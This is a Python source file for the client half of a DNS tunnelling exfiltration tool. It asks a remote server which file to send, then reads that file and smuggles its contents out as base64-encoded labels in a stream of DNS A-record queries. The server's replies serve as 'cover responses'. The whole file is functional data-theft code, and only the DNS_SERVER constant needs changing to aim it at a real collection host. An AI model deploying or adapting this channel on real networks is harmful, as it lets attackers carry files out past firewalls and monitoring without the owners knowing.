__author__ = "Adel Tchernitsky"


import dns.message
import dns.query
import dns.rdatatype
import base64
import hashlib


DNS_SERVER = "127.0.0.1"
DNS_PORT = 53  # default DNS port

CHUNK_SIZE = 12        # bytes per chunk (before encoding)
LABEL_LENGTH = 2       # characters per DNS label


# Encoding Utilities
def base64_dns_encode(data):  # data should already be bytes
    """Encode bytes to Base64 string safe for DNS labels"""
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def split_chunks(data, size):
    """Split bytes into fixed-size chunks"""
    return [data[i:i + size] for i in range(0, len(data), size)]


def insert_dots(data, every):
    """Insert a dot every n characters (DNS label formatting)"""
    return ".".join(data[i:i + every] for i in range(0, len(data), every))


def prepare_dns_payload(data):
    """Convert raw bytes into DNS-safe domain names"""
    chunks = split_chunks(data, CHUNK_SIZE)
    domains = []

    for chunk in chunks:
        encoded = base64_dns_encode(chunk)
        domains.append(insert_dots(encoded, LABEL_LENGTH))

    return domains


# File Utilities
def read_file(path):
    """Read file as bytes"""
    try:
        with open(path, "rb") as f:
            return f.read()

    except FileNotFoundError:
        return b"Error: The file does not exist"


def file_message_id(data: bytes) -> int:
    """Generate deterministic 16-bit DNS message ID from file hash."""
    digest = hashlib.sha256(data).hexdigest()
    return int(digest[:4], 16)


# DNS Communication
def send_dns_queries(domains, record_type, msg_id=None):
    """Send DNS queries and return responses."""
    responses = []

    for domain in domains:
        query = dns.message.make_query(domain, record_type)

        if msg_id is not None:
            query.id = msg_id

        try:
            response = dns.query.udp(
                query,
                DNS_SERVER,
                port=DNS_PORT,
                timeout=30
            )
            responses.append(response)
        except Exception as e:
            print(f"[!] DNS error for {domain}: {e}")

    return responses


def send_control_txt(message: str):
    """Send a TXT control message to the server."""
    domain = insert_dots(
        base64_dns_encode(message.encode()),
        LABEL_LENGTH
    )
    return send_dns_queries([domain], dns.rdatatype.TXT)


# Client Logic
def request_file_name():
    """Ask the server which file should be sent."""
    responses = send_control_txt("Which file would you like to receive")

    for response in responses:
        for answer in response.answer:
            if answer.rdtype == dns.rdatatype.TXT:
                for rdata in answer:
                    if rdata.strings:
                        return rdata.strings[0].decode(errors="ignore")

    return None


def send_file(path: str):
    file_data = read_file(path)
    if file_data is None:
        print("[!] File not found.")
        return

    # Send file length first
    length_domains = prepare_dns_payload(str(len(file_data)).encode())
    send_dns_queries(length_domains, dns.rdatatype.A)

    # Send file content
    msg_id = file_message_id(file_data)
    data_domains = prepare_dns_payload(file_data)
    responses = send_dns_queries(data_domains, dns.rdatatype.A, msg_id)

    # Print server cover responses
    for response in responses:
        for answer in response.answer:
            if answer.rdtype == dns.rdatatype.A:
                for item in answer.items:
                    print(f"[<] Response IP: {item.address}")


def main():
    file_name = request_file_name()
    if not file_name:
        print("[!] Server did not provide a file.")
        return

    print(f"[+] Sending file: {file_name}")
    send_file(file_name)


if __name__ == "__main__":
    main()
